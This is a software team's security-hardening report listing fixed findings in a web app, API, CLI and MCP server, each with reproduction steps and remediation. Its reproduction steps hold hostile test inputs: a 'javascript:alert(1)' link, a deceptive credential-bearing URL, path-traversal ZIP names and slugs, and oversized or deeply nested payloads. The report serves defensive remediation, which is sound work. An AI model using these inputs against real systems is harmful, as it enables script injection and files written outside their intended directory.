# Step 37 — Security hardening

Status: **in progress; 118 local security findings are fixed and regression-tested (two critical, twenty-one high, ninety-four medium, one low). The remaining gate is release-candidate deployed security verification; remote Cloudflare namespace provisioning and tunnel ingress are not applicable under D-041. OS restart recovery passed on 2026-10-22, with the limitation that no queued inference job was held across the shutdown.**

## Scope and method

Reviewed the Sites preview boundary, shared AI provider proxy, laptop inference

API/daemon, unauthenticated MCP/SSE adapter, ZIP creation, MCP filesystem and

input bounds, CLI output paths, and ingestion patch paths. Each changed boundary

received a user-facing or protocol-level regression test. New regressions were

run before implementation to verify that they failed, then rerun after the fix.

The checks ran locally on `consolidation/product-hardening`. No code was

deployed during this step. The previously established Sites Worker checks for

opaque sandbox preview CSP, asset CORS, backend-offline behavior, inference

authorization, and the secret scan remain relevant evidence. They do not close

the remaining API, host, supply-chain, and production configuration audit.

The existing review Site was also probed read-only at `/` and `/r/button`:

both routes returned 200, the preview had an opaque origin, parent DOM/storage

access was blocked, and there were no console errors, uncaught exceptions,

failed requests, or error responses. That deployed version still has a broader

script/style CSP than the local fix; redeployment verification remains open.

The local Sites Worker regression now also attempts an external HTTPS fetch

from the opaque preview frame. The frame's `connect-src` policy rejects the

request before it reaches the network; the parent page remains error-free and

the attempted destination receives no browser request. This strengthens the

local isolation evidence, but does not replace the later deployed-version

check.

## Findings and remediation

### SEC-37-047 — Medium — preview CSP allowed scripts and styles from the entire Site origin

**Evidence:** The deployed `/r/button` preview returned HTTP 200 inside an

`allow-scripts` sandbox with opaque origin and blocked parent DOM/storage

access. Its CSP nevertheless declared `script-src https://<site-origin>` and

`style-src https://<site-origin>`, broader than the documented compiled-asset

boundary. The live probe and before screenshot are recorded in

`evidence/step-37/deployed-preview-runtime.json`,

`evidence/step-37/deployed-resource-preview-1440.png`, and

`evidence/step-37/deployed-home-1440.png`.

**Reproduction:** Open the existing review Site's `/r/button` route and inspect

the `/preview?resource=button` response CSP. Before the fix, the red regression

received the whole origin in `script-src` and `style-src` instead of the

`/_astro/` asset path.

**Root cause:** The Sites Worker CSP used the bare Site origin for executable

script and stylesheet sources while its comment and `connect-src` rule promised

that preview frames could load only compiled public assets.

**Affected code:** `apps/sites/worker.ts` and

`tests/e2e/sites-preview-csp.spec.ts`.

**Remediation:** Restrict preview `script-src` and `style-src` to the compiled

`/_astro/` path while retaining the inline styles and preview bootstrap needed

by the static artifact. The regression failed before the change and passes

after it; all 324 catalog resources at certified widths and all Gold variants

pass under the narrowed policy. The existing deployed review Site still carries

the older policy pending the later review deployment.

### SEC-37-048 — Medium — CLI disguised a blocked private registry as a missing resource

**Evidence:** A black-box CLI test configured `https://127.0.0.1:65535/r` with

the trusted-local opt-in unset, then ran `tess add button`. The registry safety

guard correctly refused the destination and created no files, but the CLI

reported only that the resource could not be found. The regression failed

before the fix because the explicit policy message was absent.

**Reproduction:** In a clean directory, configure the private URL above and run

`tess add button` with `TESS_ALLOW_PRIVATE_REGISTRY` unset. Before the fix, the

command exited nonzero but reported a missing resource rather than the network

policy that stopped the request.

**Root cause:** `resolveRegistryItem` caught every network error and converted

it to
ull`, including the typed error raised by the private/local destination

guard.

**Affected code:** `packages/cli/src/registry-io.ts`,

`packages/cli/src/commands/add.ts`, and

`packages/cli/src/__tests__/black-box.test.ts`.

**Remediation:** Give registry policy failures a dedicated error type and let

`tess add` surface that message while keeping transient network failures on the

existing not-found path. The red black-box regression now passes, confirms a

nonzero exit, and verifies no component directory is created. A repository

scan found the opt-in is only read by the CLI; no workflow or application

configuration sets it implicitly.

### SEC-37-049 — Medium — Existing laptop secret files kept broader Windows ACLs

**Evidence:** A Windows NTFS fixture gave a preexisting secret file read access

to `BUILTIN\Users`, then applied the startup script's former directory-only ACL

restriction. The file still granted Users read access. The new PowerShell

regression failed against that behavior, then passed after the helper reset the

existing file ACL and granted access only to the current owner and SYSTEM. The

test records no real credential values and is documented in

`evidence/step-37/secret-acl-windows.json`.

**Reproduction:** Create a secret file with an explicit Users read grant,

restrict only its parent directory, and inspect the file ACL. The old behavior

leaves the explicit file grant in place.

**Root cause:** Restricting NTFS directory inheritance does not remove explicit

permissions already stored on child files.

**Affected code:** `scripts/Start-LaptopBackend.ps1`,

`scripts/TessellateSecretAcl.psm1`, and

`scripts/tests/Test-LaptopSecretAcl.ps1`; `.github/workflows/ci.yml` runs the

Windows-specific regression on every CI build.

**Remediation:** Startup now resets ACLs on existing regular files directly

inside the dedicated secret directory and grants only the owner and SYSTEM. It

refuses reparse points and paths outside that directory. The Windows fixture

test failed before the file-level ACL fix and now passes.

### SEC-37-050 — Critical — Astro 5.x included a build-time code-execution advisory

**Evidence:** `pnpm audit --prod --audit-level high` returned exit code 1 with

Astro 5.18.2 in the production dependency tree and a critical AVIF optimization

code-execution advisory. The full audit reported 48 findings before the update.

After the update, `pnpm audit` reports no known vulnerabilities.

**Reproduction:** Run `pnpm audit --prod --audit-level high` before the package

update; the result identifies `apps/site > astro` at 5.18.2.

**Root cause:** The lockfile retained Astro 5 after the upstream package had

published a security fix in Astro 7.2.8.

**Affected code:** `apps/site/package.json`, `apps/site/astro.config.mjs`, and

`pnpm-lock.yaml`.

**Remediation:** Upgrade the existing Astro + React static app to Astro 7.2.8

and `@astrojs/react` 7.1.0. Keep the established rehype behavior by using

`unified()` from `@astrojs/markdown-remark`; all 717 static routes build. The

Sites CSP test verifies that build-generated script and style hashes still

match the preview document. See `evidence/step-37/dependency-audit.json`.

### SEC-37-051 — Critical — Vitest and Tinypool versions exposed test-runner code execution

**Evidence:** The pre-fix registry audit found Vitest 2.1.9 and Tinypool 1.1.1

in workspace test paths, including two critical prototype-pollution/code

execution advisories and a critical file-read advisory for the Vitest UI server.

**Reproduction:** Run `pnpm audit` against the previous lockfile; the reported

paths include `packages/registry-gate > vitest` and nested workspace test tools.

**Root cause:** Workspace packages had drifted across Vitest 2 and 3 and shared

the vulnerable Tinypool 1 dependency.

**Affected code:** Root and package Vitest versions in `package.json`,

`packages/registry-gate/package.json`, `packages/ingest/package.json`,

`packages/linter/package.json`, and `pnpm-lock.yaml`.

**Remediation:** Align all Vitest consumers on 4.1.11. The dependency advisory

gate is now part of `pnpm audit:all` and CI. Full unit, typecheck, and E2E reruns

on the upgraded runner remain part of this verification pass.

### SEC-37-052 — High — Vite versions had path traversal and Windows file-boundary advisories

**Evidence:** The registry audit found Vite 5.4.21 and 8.0.13 in application

and test paths, including the Windows `server.fs.deny` bypass fixed in 8.0.16.

**Reproduction:** Run `pnpm audit` against the prior lockfile; vulnerable paths

include the Astro application and registry-gate Vitest stack.

**Root cause:** The public app, Site adapter, preview app, and tests had resolved

several Vite majors and stale patch versions.

**Affected code:** `apps/site/package.json`, `apps/sites/package.json`,

`apps/preview/package.json`, and `pnpm-lock.yaml`.

**Remediation:** Align the workspace on Vite 8.3.4 and compatible React plugin

6.1.2. `pnpm peers check` now passes with no peer dependency issues; Astro and

Sites builds and the browser CSP test pass.

### SEC-37-053 — High — Miniflare dependencies contained vulnerable HTTP, WebSocket and image codec packages

**Evidence:** The audit found vulnerable `undici` 7.24.8, `sharp` 0.34.5, and

`ws` 8.18.0 through Wrangler/Miniflare paths. The production-only audit also

reported Astro's optional `sharp` dependency.

**Reproduction:** Run `pnpm audit` against the previous lockfile; affected paths

include the API, laptop backend, Sites Worker, and Astro build.

**Root cause:** An unused direct Miniflare dependency and older locked

transitives kept packages below their patched releases.

**Affected code:** `apps/api/package.json`, `pnpm-workspace.yaml`, and

`pnpm-lock.yaml`.

**Remediation:** Remove Miniflare from runtime dependencies while retaining the

version required by API test fixtures as a development-only dependency. Constrain

the affected transitives to `undici` 7.29.1, `sharp` 0.35.5, and `ws` 8.21.0. Keep

the pinned Wrangler 4.92.0 local runtime unchanged. The frozen install and full

registry audit pass.

### SEC-37-054 — Low — Wrangler's Windows development-server bundle used vulnerable esbuild

**Evidence:** The previous lockfile used esbuild 0.27.3 through Wrangler,

triggering the Windows development-server arbitrary-file-read advisory.

**Reproduction:** Run `pnpm audit` on Windows against the previous lockfile.

**Root cause:** The pinned Wrangler dependency range resolved to esbuild below

the advisory's 0.28.1 patch.

**Affected code:** `pnpm-workspace.yaml` and `pnpm-lock.yaml`.

**Remediation:** Override only esbuild 0.27.3 to patched 0.28.2 without changing

the pinned Wrangler runtime. The post-fix audit reports zero known

vulnerabilities.

### SEC-37-055 — Medium — Astro 7 background preview server broke Playwright startup

**Evidence:** After the Astro 7.2.8 upgrade, `pnpm test:e2e` exited before

running tests because Playwright observed its `astro preview` webServer command

exit early. Running that command directly showed Astro had daemonized

successfully and served the production site with HTTP 200, but the test runner

requires a foreground server process.

**Reproduction:** Run `pnpm test:e2e`; before the fix the default suite reports

`Process from config.webServer exited early`. Running the configured preview

command separately confirms it backgrounds a process and returns.

**Root cause:** Astro 7's preview CLI starts a background daemon by default,

while the prior test harness assumed a long-lived foreground process.

**Affected code:** `playwright.config.ts` and

`scripts/astro-preview-webserver.mjs`.

**Remediation:** Set `ASTRO_PREVIEW_BACKGROUND=0` in Playwright's server

environment. Astro then serves the production build in the foreground, letting

Playwright start and tear down the process it owns. The `/tools` route test

passes and Astro reports no remaining preview server after teardown. The full

E2E rerun then passed 328 tests with 117 configured skips.

### SEC-37-056 — Medium — Docker backend verifier raced API recovery after restart

**Evidence:** The first current Docker verification run failed with an

`UND_ERR_SOCKET` connection close while reading the queued ticket immediately

after restarting `tessellate-laptop-api-1`. The API subsequently reported

healthy and the host came back healthy; the verifier had failed during the

short recovery interval, before it could write new evidence. Before/after

details are recorded in `evidence/step-37/docker-restart-race.json`.

**Reproduction:** Run
ode scripts/verify-laptop-backend.mjs` while the host

container is paused and the API container is restarted as part of the test. The

previous verifier checked generic health, then issued a single status request

while D1 was still reconnecting.

**Root cause:** A healthy root or inference health response did not prove that

the specific queued ticket could already be read after the API restart.

**Affected code:** `scripts/verify-laptop-backend.mjs`.

**Remediation:** Retry the authenticated ticket-status request itself for up to

30 seconds, tolerating transient transport failures and requiring the queued

state. The latest Docker run passes all seven checks, including API restart,

offline rejection, task recovery, and stopped-backend reachability.

### Medium — ZIP creation accepted paths that escape the extraction directory

**Evidence:** Before the fix, the new regression test accepted `../outside.txt`

instead of throwing. The same helper also accepted drive-root paths and

separator/case aliases that can overwrite the same destination on Windows.

The red test is recorded in `evidence/step-37/verification.json`.

**Reproduction:** Call `createZipArchive` with `../outside.txt`, `C:\\outside.txt`,

or a pair such as `src/App.tsx` and `src\\App.tsx`.

**Root cause:** The shared ZIP helper passed caller-supplied record keys straight

to `fflate` without validating or canonicalizing archive paths.

**Affected code:** `packages/exporter/src/zip.ts`.

**Remediation:** Normalize archive separators, reject absolute, traversal,

control, device-name and non-portable segments, reject case/separator aliases,

and use a null-prototype archive record. The path regression and generated

standalone archive round-trip both pass. The ZIP helper does not extract files;

the change prevents it from producing an archive with unsafe destination names.

### Medium — AI proxy buffered unbounded bodies before enforcing limits

**Evidence:** Before the fix, an oversized streamed request was fully consumed

before returning 413, and a provider response larger than 8 MiB was returned

with status 200. Both newly added tests failed before the fix and pass after it.

**Reproduction:** Send a request stream with a misleading `Content-Length` that

continues beyond 512 KiB, or mock an allowlisted provider response larger than

8 MiB.

**Root cause:** The proxy called `arrayBuffer()` on both incoming and provider

bodies, checking only the request size after full buffering and applying no

provider response cap.

**Affected code:** `apps/api/src/routes/ai-proxy.ts`.

**Remediation:** Read both streams incrementally, cancel when the request

crosses 512 KiB or the provider response crosses 8 MiB, and return 413/502 with

bounded error bodies. Provider responses remain uncached and unpersisted.

### Medium — Unauthenticated MCP/SSE could bind publicly and accepted untrusted origins

**Evidence:** Before the fix, a request carrying `Origin: https://untrusted.example`

received 200 from `/health`, and the unauthenticated adapter successfully bound

to `0.0.0.0`. Both new regression tests failed before the fix and pass after it.

**Reproduction:** Start `startMcpSseServer({ host: '0.0.0.0' })`, or send a GET

with an unlisted browser Origin to `/health` or `/sse`.

**Root cause:** The adapter used its Origin allowlist only to set CORS headers

and answer preflight requests. Its public `host` option could bind the server

to a non-loopback interface despite the transport having no authentication.

**Affected code:** `packages/mcp/src/server-sse.ts`.

**Remediation:** Reject non-loopback hosts and reject requests carrying an

unlisted Origin before serving data or creating an SSE session. Origin-less

local MCP clients and explicitly allowed browser Origins continue to work.

### Medium — Other API routes parsed request bodies without a streaming size cap

**Evidence:** Before the fix, a public report request with a deliberately false

`Content-Length` was read to the end and then returned 400 for malformed JSON.

A second regression exposed that a request rejected immediately from an

oversized declared length returned 413 but left its body stream uncancelled.

Both regressions now verify early rejection and stream cancellation.

**Reproduction:** POST an unbounded stream to `/api/reports` with

`Content-Length: 1`; previously the route consumed every chunk before parsing.

Also declare `Content-Length: 65537` and provide a stream; previously the

middleware rejected it without cancelling the stream.

**Root cause:** Only the AI proxy and inference queue had size checks, and the

proxy checked only after fully buffering its body. Account, project, collection,

favorite, creator-link and report routes used Hono's unbounded JSON parser.

**Affected code:** `apps/api/src/index.ts`, `apps/api/src/request-body.ts`.

**Remediation:** Shared middleware now enforces limits while reading: 64 KiB

for ordinary API calls, 1.5 MB for cloud-project payloads, 512 KiB for AI

provider requests, and 96 KiB for inference requests. It cancels rejected

streams both when declared length exceeds the limit and when streamed bytes

cross it, then reconstructs only bodies that fit.

### Medium — Creator links accepted executable and deceptive URL schemes

**Evidence:** Before the fix, the authenticated API accepted `javascript:` and

`data:` URLs and a URL with embedded credentials. The new API regression failed

before the fix and passes after it.

**Reproduction:** POST a creator link with `url: "javascript:alert(1)"` or

`https://trusted.example@evil.example/path` to `/api/creator-links`.

**Root cause:**
ew URL()` was used only as a syntax check; it accepts schemes

and credential-bearing hosts that are unsafe when later presented as public

links.

**Affected code:** `apps/api/src/routes/creator-links.ts`.

**Remediation:** Persist only bounded, non-empty HTTP(S) URLs without embedded

credentials, normalize them with `URL.href`, and bound the visible title.

### Medium — Public reports accepted malformed values through truthiness and coercion

**Evidence:** Before the fix, a report with `targetId: {}` and

`reason: ["abuse"]` passed required-field checks and returned 201. The new

regression failed on that behavior and passes with the existing valid-report

workflow.

**Reproduction:** POST `{ "targetType": "project", "targetId": {},

"reason": ["abuse"] }` to `/api/reports`.

**Root cause:** The route checked only truthiness, then converted arbitrary

values with `String(...)` before persistence. Target type, field lengths and

unknown properties were not constrained by a route schema.

**Affected code:** `apps/api/src/routes/reports.ts`.

**Remediation:** Validate the request with a strict Zod schema before Turnstile

or persistence: fixed target-type enum, trimmed non-empty string identifiers

and reasons, bounded details/token fields, and rejection of extra properties.

### Medium — Collection creation treated the string `"false"` as public

**Evidence:** Before the fix, an authenticated create request with

`{"name":"Keep private","isPublic":"false"}` returned 201 and stored a

public collection. The new regression returned 400 before the fix and now

passes alongside the normal public collection workflow.

**Reproduction:** POST a collection whose `isPublic` field is the string

`"false"` instead of the JSON boolean `false`.

**Root cause:** The handler used JavaScript truthiness (`body.isPublic ? 1 : 0`)

instead of validating the field as a boolean. The collection could be exposed

to guests despite the caller's string value representing false.

**Affected code:** `apps/api/src/routes/collections.ts`.

**Remediation:** Require a strict schema for collection name, description and

boolean visibility. Only the actual boolean `true` publishes a collection;

invalid types and unknown fields are rejected before storage.

### Medium — Profile update treated the string `"false"` as public availability

**Evidence:** Before the fix, an authenticated `PUT /api/me` with

`{"isAvailableForWork":"false"}` returned 200 and stored the boolean `true`.

The new regression failed before the fix and now returns 400.

**Reproduction:** Send the availability flag as the string `"false"` rather

than a JSON boolean.

**Root cause:** The profile route used `Boolean(body.isAvailableForWork)`, which

turns every non-empty string into `true` and could expose an unintended

availability status.

**Affected code:** `apps/api/src/routes/me.ts`.

**Remediation:** Validate the optional availability field as a JSON boolean

before updating the profile; malformed JSON or a different value type returns

400, and valid requests preserve the existing profile update behavior.

### High — Cloud-project metadata updates replaced the saved manifest with `{}`

**Evidence:** Before the fix, a valid metadata-only `PUT /api/projects/:id`

advanced the revision and replaced the project's manifest JSON with `{}`. The

new test failed on that exact content loss before the fix.

**Reproduction:** Create a project, then update only its name/description with

the required `expectedRevision`, omitting both manifest fields. Read the project

again; the prior handler returned an empty object for `manifestJson`.

**Root cause:** Both D1 and in-memory update paths used

`JSON.stringify(body.manifest ?? {})` whenever `manifestJson` was absent, even

for supported metadata-only updates.

**Affected code:** `apps/api/src/routes/projects.ts`.

**Remediation:** Resolve metadata-only saves against the validated stored

manifest and update only its metadata. Persist the normalized manifest and the

revision snapshot atomically; if stored data cannot be validated, refuse the

write and preserve the previous revision.

### Medium — Cloud-project API stored manifests without canonical validation

**Evidence:** Before the fix, project creation with `manifest: { "screens": [] }`

returned 201. The new regression failed before the fix, and now invalid create

and update payloads return 400 without creating a record or advancing a

revision.

**Reproduction:** POST a project with `{ "screens": [] }` as its manifest or

send that value to the project update endpoint.

**Root cause:** Project routes serialized caller-provided objects or strings

without parsing them through Tessellate's `ProjectManifest` schema and migration

path, then made the data available for publish/remix.

**Affected code:** `apps/api/src/routes/projects.ts`.

**Remediation:** Parse JSON strings, migrate/validate through the shared

`migrateProjectManifest` contract, require the manifest ID to match the cloud

project, align project name/description metadata, and reject invalid payloads

before storage.

### Medium — Corrupted published manifests caused server errors and mismatched data

**Evidence:** A D1 regression replaced a published manifest with `{not-json`.

Before the fix, both public read and remix returned HTTP 500 and the Worker

logged the raw `SyntaxError`. A valid manifest whose ID did not match the

published row was also not checked before serving.

**Reproduction:** Publish a valid D1-backed project, then change its stored

`manifestJson` to invalid JSON or a different project's valid manifest. Request

the public view and the remix endpoint.

**Root cause:** The published routes called `JSON.parse` on persisted data

without the canonical migration/schema or identity check.

**Affected code:** `apps/api/src/routes/published.ts`.

**Remediation:** Bound the persisted string, migrate and validate it through

`migrateProjectManifest`, and require its ID to match the published row. Public

read and remix now fail with a controlled 503 and do not expose or copy the

invalid record.

### Medium — Profile specialty tags accepted invalid values and corrupted rows returned HTTP 500

**Evidence:** Before the fix, an authenticated profile update with a mixed

string/object tag array returned 200. A D1 profile row containing `{not-json`

then made `GET /api/me` throw `SyntaxError` and return 500.

**Reproduction:** PUT `specialtyTags: ["design systems", {"label":"bad"}]`, or

store malformed JSON in the profile's `specialtyTags` column and GET `/api/me`.

**Root cause:** The update schema validated only the availability flag and the

read route parsed stored tag JSON without validating its value.

**Affected code:** `apps/api/src/routes/me.ts`.

**Remediation:** Accept at most 20 non-empty, bounded string tags. Validate

stored tags before returning them and return a controlled 503 when persisted

profile data cannot be decoded; the availability field also uses an exact

integer check rather than generic truthiness.

### Medium — Guest and cloud remixes reused the source manifest identity

**Evidence:** Before the fix, the guest response failed

`ProjectManifestSchema.safeParse` because it retained the source ID and added

an unsupported `metadata` property. The cloud response created a new project

ID while returning and storing a manifest with the source ID and source name.

The new D1 regression compares the persisted manifest ID to the remixed project.

**Reproduction:** Publish a project and use both guest and authenticated remix

endpoints. Validate the guest response and read the D1 cloud copy.

**Root cause:** Remix logic changed only a non-canonical metadata object for

guests and copied the source JSON unchanged for authenticated users.

**Affected code:** `apps/api/src/routes/published.ts`.

**Remediation:** Create a fresh project ID, set the canonical root
ame`,

refresh timestamps, and reset history counters while preserving the source

design. Guest and cloud responses now pass the manifest schema; D1 storage and

the initial revision use the same remixed manifest.

### Medium — Cloud project reads and checkpoints trusted corrupted stored manifests

**Evidence:** A D1 regression created a valid project and then replaced its

stored manifest with `{not-json`. Before the fix, owner read, project list and

revision list returned 200, checkpoint creation returned 201, and publishing

returned 200. A corrupt revision snapshot was also returned with 200.

**Reproduction:** Create a D1 project, corrupt its `manifestJson`, then request

the project, project list, revisions, a new checkpoint, and publish. Separately

corrupt a `project_revisions.manifestJson` value and list revisions.

**Root cause:** Only writes validated manifests. Read, list, revision, checkpoint

and publish handlers trusted persisted JSON, so bad records could be returned,

copied to history, or exposed publicly.

**Affected code:** `apps/api/src/routes/projects.ts`.

**Remediation:** Bound, migrate, validate and identity-check stored manifests on

reads and before checkpoint or publish. Invalid current project data returns a

controlled 503 and does not change revisions or publish. Valid historical

revisions remain available as a recovery source; invalid revision snapshots

return 503. The owner can still delete the corrupted project.

### Medium — Favorites and collection items accepted invalid resource identifiers

**Evidence:** Before the fix, `POST /api/favorites` accepted whitespace,

121-character identifiers, and `../button` with HTTP 201. Adding those values

to a collection also succeeded. Regression tests now require HTTP 400 for all

three invalid forms.

**Reproduction:** Submit each invalid `resourceSlug` to the favorite endpoint

and each invalid slug to a collection's item endpoint.

**Root cause:** The route handlers checked only that the value was a string,

so empty, oversized, and path-like identifiers were persisted as resource

references.

**Affected code:** `apps/api/src/resource-slug.ts`,

`apps/api/src/routes/favorites.ts`, and

`apps/api/src/routes/collections.ts`.

**Remediation:** Both routes now share one Zod slug contract: trimmed,

lowercase alphanumeric segments separated by hyphens, between 1 and 120

characters. Invalid values fail with HTTP 400 before persistence.

### High — Corrupt collection visibility flags could expose private collections

**Evidence:** A D1 row with `isPublic=2` represented a private collection but

the anonymous detail endpoint returned HTTP 200 before the fix. The owner list

also coerced any nonzero value to `true`. A red-to-green D1 regression now

requires both reads to fail safely with HTTP 503.

**Reproduction:** Insert a private collection with an invalid integer visibility

value, then GET `/api/collections/:id` anonymously and GET `/api/collections`

as its owner.

**Root cause:** The route used JavaScript truthiness for a persisted integer

without confirming the only valid stored values are `0` and `1`.

**Affected code:** `apps/api/src/routes/collections.ts` and

`apps/api/src/__tests__/cloud-sync-d1.test.ts`.

**Remediation:** Validate persisted visibility as exactly integer `0` or `1`

before returning collection details or lists. Unknown values return a

controlled 503, preserving privacy rather than treating corrupt state as

public.

### Medium — Production report submission bypassed abuse checks without Turnstile configuration

**Evidence:** Before the fix, a public report with no challenge token and no

`TURNSTILE_SECRET_KEY` returned HTTP 201 even with

`RUNTIME_ENVIRONMENT=production`. The red regression reproduced the accepted

submission; it now expects a controlled HTTP 503.

**Reproduction:** POST a valid report without a Turnstile token to a production

runtime that has no Turnstile secret configured.

**Root cause:** The verification helper treated every missing secret as local

or test mode, because it had no runtime-mode input.

**Affected code:** `apps/api/src/routes/reports.ts`, `apps/api/src/turnstile.ts`,

`apps/api/src/types.ts`, and the API development script.

**Remediation:** A missing challenge secret now fails closed unless the server

explicitly identifies its runtime as development or test. The API dev script

sets development mode; tests set test mode. Provider/network failures return

503 and invalid challenge tokens return 403.

### Medium — Partial profile updates erased omitted creator fields

**Evidence:** Before the fix, updating only `specialtyTags` after saving a

profile reset its username to the email prefix, cleared biography and GitHub

handle, and changed availability to false. Regressions reproduced this in the

in-memory route and in D1; both now preserve omitted fields.

**Reproduction:** Save a profile with a custom username, biography, GitHub

handle, tags, and availability enabled. PUT only a new `specialtyTags` array,

then GET the profile.

**Root cause:** The handler reconstructed a complete profile from request

fields and defaults for every PUT instead of merging the partial request with

the validated existing profile.

**Affected code:** `apps/api/src/routes/me.ts` and its in-memory/D1 API tests.

**Remediation:** Parse the existing profile and apply only fields present in

the strict request schema. Corrupt stored tags or availability now fail closed

instead of being overwritten during a partial update.

### Medium — Profile fields drifted from OpenAPI and unknown values were silently accepted

**Evidence:** OpenAPI advertised `githubUrl`, but the handler read

`githubHandle`; sending the documented field returned 200 and silently ignored

it. A red regression now requires an unknown field to return HTTP 400.

**Reproduction:** Inspect `/openapi.json` for the `/api/me` request schema, then

PUT the advertised `githubUrl` field to `/api/me`.

**Root cause:** The profile schema used `.passthrough()` and defined only two of

the fields handled by the route, while the OpenAPI request shape was stale.

**Affected code:** `apps/api/src/routes/me.ts`,

`packages/registry/src/openapi-generator.ts`, and generated

`apps/site/public/openapi.json`.

**Remediation:** Define and strictly validate the supported username, bio,

avatar URL, GitHub handle, specialty tags, and availability fields. Update the

OpenAPI request schema to those same fields and bounds.

### Medium — Deeply nested ProjectNode input overflowed API validation

**Evidence:** A valid-shaped inference request under the 96 KiB body limit with

1,000 nested ProjectNodes caused `ProjectNodeSchema.safeParse` to throw a

`RangeError`. Before the fix the inference route returned 503 and logged a

generic storage failure. The route-level regression expected 400 and failed

with `expected 400, received 503`.

**Reproduction:** POST `/api/inference/queue` with a prompt and a 1,000-level

`screenAst` tree. No model host is required to reproduce the validation error.

**Root cause:** The shared recursive ProjectNode Zod schema had no depth bound;

`safeParse` does not catch a JavaScript stack overflow thrown during recursive

schema evaluation.

**Affected code:** `packages/schemas/src/project.ts` and

`apps/api/src/__tests__/inference-queue.test.ts`.

**Remediation:** Cap ProjectNode nesting at 65 levels (root depth zero), cache

the depth-specific schemas, and reject any child beyond that bound through a

normal schema issue. The inference route now returns 400 and queues no work.

The failing user-request regression passes after the fix.

### Medium — API abuse-prone routes had no shared rate-limit enforcement

**Evidence:** Before the fix, new rate-limit regressions showed that a

rejecting limiter did not affect report or favorite writes: both returned 201.

Without the production limiter binding, the report request reached Turnstile

instead of reporting the missing rate-limit protection. The red tests and

responses are recorded in `evidence/step-37/verification.json`.

**Reproduction:** Configure a rejecting public-write limiter and POST a report,

or configure a rejecting account limiter and POST a favorite. Before the fix,

both requests continued into their handlers. The same gap affected projects,

collections, profile and creator-link mutations, auth endpoints, and the

BYO-AI proxy. The inference status route also needed protection because the

Workbench polls it every 750 ms and the handler performs D1 expiry maintenance.

Before the fix, that status request reached D1 instead of being rejected by a

per-client limiter.

**Root cause:** Routes had request-size limits and the inference queue had a

targeted D1 quota, but shared limits were absent for account mutations, auth

traffic, anonymous writes, the provider proxy, and inference-client polling.

**Affected code:** `apps/api/src/rate-limit.ts`, API route handlers, and both

Worker configuration files.

**Remediation:** Cloudflare Worker bindings now limit public writes to 20/minute

per caller, account writes to 120/minute per account, auth requests to

30/minute per caller, and BYO-AI proxy requests to 30/minute per provider-key

fingerprint; inference health/queue/status/cancel requests are limited to

120/minute per pseudonymous client after gateway authentication. Provider keys are SHA-256

fingerprinted in memory and never persisted. Missing production bindings or

limiter failures return 503. Docker's local simulation permits 20 public writes

and rejects the next with 429. The status limiter runs before the handler

reaches D1 expiry maintenance.

Cloudflare counters are location-local and eventually consistent, so they

mitigate abuse and request storms but are not exact global quotas. Namespace

IDs still need a uniqueness check in the target account before publishing. The Preview bundle

size advisory is tracked for Step 38; the public initial-JS and Workbench route

budgets passed.

### High — CLI configuration could write outside the project

**Evidence:** A black-box `tess add button` run read `componentsDir: "../…"`

from the project config and wrote both resource files to a sibling directory.

Directory junctions also redirected configured output. A registry filename of

`..` could resolve above the configured component directory.

**Reproduction:** Create `tessellate.json` with `componentsDir` set to a sibling

path, then run `tess add button`. Repeat with `componentsDir` pointing to a

junction outside the project. For a registry-file case, use `componentsDir: .`

and a registry file whose output `path` is `..`.

**Root cause:** CLI init/add/resource scaffolding joined project config and

registry-controlled paths without validating containment or symlink targets.

**Affected code:** `packages/cli/src/config.ts`, `commands/add.ts`,

`commands/init.ts`, and `commands/create-resource.ts`.

**Remediation:** `resolveProjectPath` now requires relative paths inside the

project and validates the nearest existing ancestor with `realpath`. Init

validates both outputs before writing its config; add validates its destination

and rejects unsafe slugs and filenames; resource scaffolding applies the same

check to its directory and files. The failing black-box case now exits with an

error and leaves the sibling untouched. The two CLI suites pass 34 tests.

### Medium — MCP filesystem lookup followed external symlinks

**Evidence:** A `resources/primitives/button` junction to an external directory

caused `get_resource_code` to return the external `index.tsx`. An

`apps/site/public/data` junction also caused the local catalogue loader to read

outside the project.

**Reproduction:** Point either local MCP resource/catalogue path through a

directory junction to a directory outside the current project, then request the

resource or load the catalogue.

**Root cause:** Resource lookup checked lexical path prefixes but did not

resolve filesystem links before reading; catalogue lookup did not check its

resolved location against an allowed root.

**Affected code:** `packages/mcp/src/catalog-provider.ts`.

**Remediation:** Local catalogues are now restricted to the project or bundled

Tessellate package and real paths are checked before reads. Resource source

lookup uses the same containment check. Catalogues are capped at 32 MiB and

source responses at 256 KiB. Regression tests prove the external bytes are not

returned; the catalogue safety suite passes all six tests.

### Medium — MCP arguments and source output had no product-level bounds

**Evidence:** Tool schemas accepted unbounded query/brief strings and

ProjectManifest objects. The MCP SDK also imposed a 4 MiB HTTP message cap,

but the tool layer had no smaller workload bounds for its stdio interface.

**Reproduction:** Send a 201-character search term, a 10,001-character

composition brief, or a ProjectManifest over 1 MiB through the MCP client.

**Root cause:** Individual argument schemas were unbounded and manifest

arguments used a generic record schema without a serialized-size constraint.

**Affected code:** `packages/mcp/src/tools.ts` and

`packages/mcp/src/catalog-provider.ts`.

**Remediation:** Search/brief/control fields now have explicit length and item

limits; manifest inputs are capped at 1 MiB. Local catalogue reads are capped

at 32 MiB and returned source is capped at 256 KiB. A real stdio MCP client

verifies oversized arguments return tool errors. The MCP client and catalogue

safety suites pass all ten tests.

### Medium — CLI trusted unbounded registry responses and destinations

**Evidence:** The CLI previously parsed remote registry JSON without a response

size cap or a runtime shape check. It also parsed the remote catalogue response

without bounding the decoded body. Its configured registry transport also

needed an explicit destination boundary before fetching third-party JSON.

**Reproduction:** Return an oversized JSON body from the configured registry,

or return a nominal registry record with an empty/malformed `files` array, then

run `tess add <slug>`. The prior implementation passed the response through to

filesystem handling.

**Root cause:** `resolveRegistryItem` used `response.json()` and a TypeScript

cast, which validates neither response size nor the runtime file contracts.

Catalogue fallback had the same unbounded JSON read. Generic `fetch` did not

pin DNS resolution or reject a redirect to a private network address.

**Affected code:** `packages/cli/src/registry-io.ts`,

`packages/cli/src/commands/add.ts`, and `commands/search.ts`.

**Remediation:** Registry JSON is now streamed with a byte cap, timeout and

redirect rejection. HTTPS destinations are resolved once and pinned to the

validated address; private/local targets are denied by default. A documented

`TESS_ALLOW_PRIVATE_REGISTRY=1` opt-in permits trusted private HTTPS, and HTTP

only when its destination resolves locally/private. Catalogue responses are

capped at 32 MiB. Registry items must have a valid bounded shape, no more than

20 files, each source file is at most 256 KiB and total source is at most 512

KiB. The real transport tests cover private/public destination rules, redirects

and streaming limits; command tests reject oversized and malformed responses

before any output directory is created. Broader custom-registry deployment and

DNS edge-case review remains open.

